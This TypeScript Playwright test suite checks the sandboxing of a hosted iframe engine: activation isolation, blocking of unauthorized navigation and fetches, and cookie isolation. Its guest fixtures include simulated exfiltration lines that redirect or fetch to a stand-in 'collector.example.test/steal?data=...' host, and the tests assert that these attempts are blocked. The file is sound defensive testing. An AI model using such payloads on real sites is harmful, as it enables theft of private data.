import { chromium } from 'playwright';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { resolveChromiumExecutable } from '@/dev/testkit/render/measureWebLayout';
import { buildWorkspaceHistoryBrowser } from '@/dev/testkit/render/buildWorkspaceHistoryBrowser.mjs';
import { createWorkspaceBrowserServer } from '@/dev/testkit/render/workspaceBrowserServer';
import { appendBrowserDiagnostics, collectBrowserDiagnostics } from '../../../../../../../packages/tests/src/testkit/uiE2e/browserDiagnostics';

type HarnessWindow = Window & { hostedFrameHarness: {
    mount: (body: string, network: 'none' | 'open', networkOrigins?: string[]) => void;
    events: string[];
    activations: boolean[];
    push: (message: unknown) => void;
} };

let script = '';
let origin: string;
const server = createWorkspaceBrowserServer(() => script);
beforeAll(async () => {
    script = await buildWorkspaceHistoryBrowser({
        entryFile: 'sources/components/browser/frame/engines/WebIframeEngine.browserHarness.tsx',
        lazy: false,
    });
    await new Promise<void>(resolve => server.listen(0, '127.0.0.1', resolve));
    const address = server.address();
    if (!address || typeof address === 'string') throw new Error('Frame browser boundary did not bind');
    origin = `http://127.0.0.1:${address.port}`;
}, 600_000);
afterAll(async () => {
    if (server.listening) await new Promise<void>((resolve, reject) => server.close(error => error ? reject(error) : resolve()));
    script = '';
});

describe('caller-authored hosted frame requests in Chromium', () => {
    it('does not lend an app control activation to a guest in an inactive shell', async () => {
        const browser = await chromium.launch({ executablePath: resolveChromiumExecutable() });
        try {
            const page = await browser.newPage();
            await page.goto(origin);
            await page.addScriptTag({ url: `${origin}/bundle.js` });
            await page.evaluate(() => (window as HarnessWindow).hostedFrameHarness.mount(`<body><button>Guest</button><script>
                const channel = new MessageChannel();
                const message = {version:1,identity:{instanceId:'browser-visual',mountNonce:'browser-nonce'},sequence:0,kind:'ready',payload:null};
                parent.postMessage(message, '*', [channel.port2]);
                addEventListener('message', event => { if (event.data === 'activation-probe') channel.port1.postMessage({...message,sequence:1}); });
                document.querySelector('button').onclick = () => channel.port1.postMessage({...message,sequence:2});
            </script></body>`, 'none'));
            await page.waitForFunction(() => (window as HarnessWindow).hostedFrameHarness.activations.length === 1);
            const guest = page.frames().find(frame => frame.parentFrame()?.parentFrame() === page.mainFrame())!;
            await guest.getByRole('button').focus();
            await page.evaluate(() => {
                const button = document.createElement('button');
                button.id = 'outside';
                button.textContent = 'App control';
                button.onclick = () => {
                    const shell = document.querySelector<HTMLIFrameElement>('[data-testid="guest-navigation-shell"]');
                    shell?.contentDocument?.querySelector<HTMLIFrameElement>('iframe')?.contentWindow?.postMessage('activation-probe', '*');
                };
                document.body.append(button);
            });
            await page.locator('#outside').click();
            await page.waitForFunction(() => (window as HarnessWindow).hostedFrameHarness.activations.length === 2);
            expect(await page.evaluate(() => (window as HarnessWindow).hostedFrameHarness.activations)).toEqual([false, false]);
            await guest.getByRole('button').click();
            await page.waitForFunction(() => (window as HarnessWindow).hostedFrameHarness.activations.length === 3);
            expect(await page.evaluate(() => (window as HarnessWindow).hostedFrameHarness.activations)).toEqual([false, false, true]);
        } finally { await browser.close(); }
    });

    it.each([
        { network: 'none' as const, origins: undefined },
        { network: 'none' as const, origins: ['https://approved.example.test'] },
        { network: 'open' as const, origins: undefined },
    ])('blocks first-load self-navigation before any unauthorized request ($network, $origins)', async ({ network, origins }) => {
        const browser = await chromium.launch({ executablePath: resolveChromiumExecutable() });
        try {
            const page = await browser.newPage();
            const outbound: string[] = [];
            // Intercept the real network boundary, leaving browser CSP/navigation enforcement real.
            await page.route('https://collector.example.test/**', async route => {
                outbound.push(route.request().url());
                await route.fulfill({ contentType: 'text/html', body: '<p>Collected</p>' });
            });
            await page.goto(origin);
            await page.addScriptTag({ url: `${origin}/bundle.js` });
            await page.evaluate(({ network, origins }) => (window as HarnessWindow).hostedFrameHarness.mount(
                '<script>globalThis.scriptRan=true;location.replace("https://collector.example.test/steal?data=private-visual")</script>', network, origins,
            ), { network, origins });
            await page.waitForFunction(() => (window as HarnessWindow).hostedFrameHarness.events.includes('load'));
            expect(outbound).toEqual([]);
            const guest = page.frames().find(frame => frame.parentFrame()?.parentFrame() === page.mainFrame());
            expect(guest).toBeDefined();
        } finally { await browser.close(); }
    });

    it.each(['origins', 'open'] as const)('keeps $0 subresources, document-bound bridge replies, and host push working without navigation', async policy => {
        const browser = await chromium.launch({ executablePath: resolveChromiumExecutable() });
        let phase = 'open';
        let readDiagnostics = () => '';
        try {
            const page = await browser.newPage();
            readDiagnostics = collectBrowserDiagnostics({ page });
            const outbound: string[] = [];
            await page.route('https://**/*', async route => {
                outbound.push(route.request().url());
                await route.fulfill({ contentType: 'text/plain', headers: { 'Access-Control-Allow-Origin': '*' }, body: 'approved' });
            });
            await page.goto(origin);
            await page.addScriptTag({ url: `${origin}/bundle.js` });
            const body = `<body><button id="interactive">Live</button><script>
                globalThis.channel = new MessageChannel();
                channel.port1.onmessage = event => { document.body.dataset.reply = event.data.kind; };
                parent.postMessage({version:1,identity:{instanceId:'browser-visual',mountNonce:'browser-nonce'},sequence:0,kind:'ready',payload:null}, '*', [channel.port2]);
                fetch('https://approved.example.test/asset').then(response => response.text()).then(value => document.body.dataset.asset=value);
                fetch('https://collector.example.test/forbidden').catch(() => {});
            </script></body>`;
            const options = { body, network: policy === 'open' ? 'open' as const : 'none' as const,
                origins: policy === 'origins' ? ['https://approved.example.test'] : undefined };
            await page.evaluate(options => (window as HarnessWindow).hostedFrameHarness.mount(options.body, options.network, options.origins), options);
            phase = 'guest-ready';
            await page.waitForFunction(() => (window as HarnessWindow).hostedFrameHarness.events.includes('ready'));
            const guest = page.frames().find(frame => frame.parentFrame()?.parentFrame() === page.mainFrame())!;
            phase = 'bridge-ack-and-approved-resource';
            await guest.waitForFunction(() => document.body.dataset.reply === 'ack' && document.body.dataset.asset === 'approved');
            expect(await guest.evaluate(() => {
                try { return parent.document.cookie; } catch { return 'isolated'; }
            })).toBe('isolated');
            await page.evaluate(() => (window as HarnessWindow).hostedFrameHarness.push({ kind: 'host-push' }));
            phase = 'host-push';
            await guest.waitForFunction(() => document.body.dataset.reply === 'host-push');
            const expectedOutbound = policy === 'open'
                ? ['https://approved.example.test/asset', 'https://collector.example.test/forbidden']
                : ['https://approved.example.test/asset'];
            expect(outbound.sort()).toEqual(expectedOutbound);

            // An equivalent immutable graph must preserve the executable document and its port.
            await page.evaluate(options => (window as HarnessWindow).hostedFrameHarness.mount(options.body, options.network, options.origins), options);
            await page.evaluate(() => (window as HarnessWindow).hostedFrameHarness.push({ kind: 'retained-push' }));
            phase = 'equivalent-document-push';
            await guest.waitForFunction(() => document.body.dataset.reply === 'retained-push');
            expect(outbound.sort()).toEqual(expectedOutbound);

            await guest.evaluate(() => location.replace('https://collector.example.test/delayed?data=private-visual'));
            phase = 'navigation-retirement';
            await page.waitForFunction(() => (window as HarnessWindow).hostedFrameHarness.events.includes('retired'));
            expect(outbound.sort()).toEqual(expectedOutbound);
        } catch (error) {
            throw appendBrowserDiagnostics(error, `Frame browser phase: ${phase}\n${readDiagnostics()}`);
        } finally { await browser.close(); }
    });
});
